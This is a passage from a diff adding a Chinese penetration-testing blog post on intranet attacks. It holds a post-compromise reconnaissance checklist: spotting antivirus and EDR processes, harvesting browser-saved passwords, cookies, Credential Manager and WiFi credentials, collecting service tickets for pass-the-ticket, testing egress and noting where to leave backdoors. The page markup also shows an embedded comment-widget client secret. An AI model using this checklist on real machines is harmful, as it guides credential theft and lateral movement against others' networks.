+<pre><code class="language-cmd"># Klion推荐项目：
+
+https://github.com/Q2h1Cg/dnsbrute
+</code></pre>
+<h2 id="0x04-思路汇总">0x04 思路汇总：</h2>
+<p>Klion总结，自己完善总结作为自己测试时的Check-List：</p>
+<pre><code class="language-bash">获取当前Shell的详细权限属性信息(即priv的内容),区分当前是本地用户还是域用户
+获取当前机器的详细网络配置信息,包括 dns后缀,DNS后缀搜索列表,ip,掩码,网关,主备dns ip,dns缓存
+获取当前机器的详细系统配置信息,包括 当前系统详细版本,内核版本,位数,启动时间,网卡信息,是否虚拟机,哪种虚拟机 [eg: VMWARE,VDI(一般从厂商名能看出来)......]
+
+获取当前机器的 各类敏感 服务 / 进程列表
+需要特别关注的一些敏感进程:各类常见杀软进程 [ 赛门铁克, 360套装(包括天擎), 麦咖啡, ESET, 卡巴, 趋势, WindowsDefender, Sophos, 火绒, QQ管家...... ]
+  常规监控系统的agent端进程 [ Zabbix, Cacti(默认用snmp远程搜集系统信息), Nagios]
+  
+  敏感工具进程 [ Chrome,Firefox,Edege,IE,Xshell,Xftp,SecureCRT,Navicat,TortoiseSVN,Git,Foxmail,Filezilla,Vnc,Putty,Office套件,Teamviewer,向日葵...]
+    可疑恶意敏感进程 [ Powershell.exe, mshta.exe, cmd.exe,cscript.exe .... ]
+    各类Java服务进程 [ 通常Java权限较高,后面提权可能会用得到 ]
+    包括对应进程的详细用户权限
+
+  需要特别关注的一些敏感服务:
+    本机各类Web服务
+    本机各类数据库服务
+    本机各类杀软 / EDR服务
+    
+本机各类常规监控的相关服务：
+获取当前机器的所有Tcp / Udp 端口连接状态信息,顺手重点关注那些后期可用来&quot;提权&quot;或者搜集密码的各类敏感服务端口
+获取当前机器的所有已经安装软件列表(留后门,抓密码可能会用得到)
+获取当前用户浏览器 [ Chrome,Firefox,Edge,IE,360,QQ ] 的各类敏感数据,eg: 保存的账号密码,收藏夹链接,历史浏览记录,Cookie [ 注: 如浏览器正在运行可能无法获取相关数据 ]
+获取当前用户Windows凭据管理器中保存的各类账号密码
+获取当前用户的浏览器代理ip和端口
+出网刺探,查看当前机器能否正常出网 [ Tcp / Udp / Dns /icmp ]
+获取当前机器的 &quot;关键性本地组&quot; 成员 [ 比如,本地管理组,远程桌面组 ] 
+获取本机已启用的共享
+获取当前用户回收站,桌面里的文件目录列表
+获取最近运行的命令历史和访问过的文件记录
+获取当前机器的所有Rdp连出记录 [ 不包括连入记录 ]
+获取当前系统的防火墙状态 [开启 / 关闭]
+获取当前机器根下的计划任务列表
+获取当前用户的注册表自启动项列表
+获取当前机器的所有IPC会话
+获取当前机器的Powershell 和 .Net 版本
+获取当前机器的WIFI连接账号密码
+获取当前机器中的服务票据 [ 待后续拿到管理权限后可进行PTT操作 ]
+获取当前机器的详细补丁列表
+获取本机ARP / DNS 缓存记录
+获取本机host文件内容
+获取当前用户环境变量
+定时跟踪操作截屏 [ 需要在指定用户环境下操作 ]
+获取当前系统的Laps配置 [ 如果有 ]
+</code></pre>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/NET-01/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/NET-01/&sharesource=qzone&title=内网渗透： 资源定位及攻击思路&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/NET-01/&sharesource=weibo&title=内网渗透： 资源定位及攻击思路 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://1oecho.github.io/Qt3VXtj3c/">#
+                    内网渗透
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/ZE5av21E3/">
+                                                                                            小工具: All-in-XrayScan
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/all-in-sql/">
+                                                                                                    SQL注入漏洞利用技巧总结
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
